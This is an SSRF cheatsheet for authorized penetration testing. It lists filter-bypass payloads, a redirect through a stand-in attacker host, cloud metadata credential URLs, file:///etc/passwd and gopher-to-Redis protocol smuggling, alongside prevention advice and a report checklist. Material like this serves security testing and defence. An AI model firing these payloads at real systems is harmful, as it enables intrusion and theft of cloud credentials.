# SSRF Cheatsheet

Server-Side Request Forgery happens when the server fetches a URL you control. Test only
systems you are authorized to assess.

## 1. Find the sinks

Look for features that fetch a URL or resolve a host:

- image, PDF, or screenshot import
- webhooks and callback URLs
- URL previews and link unfurling
- RSS/feed readers
- file import from URL
- PDF generators and HTML-to-image services
- OAuth/OIDC discovery and JWKS URLs
- proxy and redirect endpoints
- cloud metadata clients

## 2. Confirm the request

Use a listener you control:

```bash
python3 -m http.server 8000
# or
nc -lvnp 8000
```

Submit:

```text
http://<your-ip>:8000/test
```

Check the listener for the request, user agent, and source IP. A DNS-only callback confirms
resolution but not necessarily a full fetch.

## 3. Target the local host

```text
http://127.0.0.1/
http://localhost/
http://127.0.0.1:8080/
http://[::1]/
http://0.0.0.0/
```

Common internal ports: 22, 80, 443, 3000, 5000, 8000, 8080, 8443, 9000, 9200, 6379, 11211.

## 4. Bypass naive filters

If `127.0.0.1` and `localhost` are blocked, try:

```text
http://127.1/
http://127.0.0.1.nip.io/
http://2130706433/          # decimal 127.0.0.1
http://0x7f000001/          # hex
http://0177.0.0.1/          # octal
http://[::ffff:127.0.0.1]/
http://localtest.me/
http://spoofed.burpcollaborator.net/
```

Redirect-based bypass:

```text
https://attacker.example/r?to=http://127.0.0.1/
```

If the server follows redirects, the allowlist may only check the first URL.

DNS rebinding:

1. Serve a hostname that resolves to a public IP first.
2. Change the DNS answer to `127.0.0.1` after the check.
3. The server connects to the internal address.

## 5. Cloud metadata

AWS:

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

GCP:

```text
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google
```

Azure:

```text
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true
```

DigitalOcean:

```text
http://169.254.169.254/metadata/v1/
```

Alibaba:

```text
http://100.100.100.200/latest/meta-data/
```

Only retrieve the minimum proof. Do not exfiltrate credentials.

## 6. Protocol smuggling

If the server uses a permissive client, try:

```text
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
ftp://127.0.0.1/
```

`gopher://` can speak raw TCP to Redis, Memcached, or SMTP. It is often blocked; test in a
lab first.

## 7. Blind SSRF

No response body? Use:

- time delays (`http://10.255.255.1/` with a short timeout)
- out-of-band DNS/HTTP callbacks
- error messages that leak the resolved IP or status
- response-length differences

A blind SSRF that only reaches an internal port can still be impactful if it triggers a
state change (e.g., Redis `CONFIG SET`).

## 8. Impact

- read cloud metadata and temporary credentials
- reach internal admin panels
- scan the internal network
- interact with Redis, Memcached, Elasticsearch, or Docker API
- bypass IP-based access controls
- chain to RCE via an internal service

## 9. Prevention

- allowlist schemes, hosts, and ports
- resolve the hostname and validate the IP after resolution
- block link-local, loopback, private, and metadata ranges
- disable redirects or re-validate each hop
- use a dedicated egress proxy with no internal access
- require authentication for metadata services
- return a generic error, not the upstream response

## 10. Report checklist

- [ ] exact request and parameter
- [ ] callback evidence
- [ ] internal target reached
- [ ] data or state change proven
- [ ] impact and remediation
- [ ] no unnecessary data exfiltrated
